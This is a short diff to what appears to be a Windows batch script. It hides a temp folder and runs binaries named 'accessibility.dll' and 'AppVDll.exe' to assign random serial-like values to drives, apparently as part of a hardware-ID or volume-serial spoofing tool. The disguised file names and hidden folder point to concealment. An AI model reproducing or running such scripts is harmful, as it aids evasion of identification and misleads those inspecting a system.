@@ -29,6 +29,9 @@ attrib +h C:\Users\k\AppData\Local\Temp\ytmp
 %MYFILES%\accessibility.dll D: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
 %MYFILES%\accessibility.dll E: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
 %MYFILES%\accessibility.dll F: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
+%MYFILES%\accessibility.dll G: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
+%MYFILES%\accessibility.dll H: %random:~-1%%random:~-1%%random:~-1%%random:~-1%-%random:~-1%%random:~-1%%random:~-1%%random:~-1%
+
 %MYFILES%\AppVDll.exe /SS %random%%random%%random%
 %MYFILES%\AppVDll.exe /BS %random%%random%%random%
 %MYFILES%\AppVDll.exe /SU auto
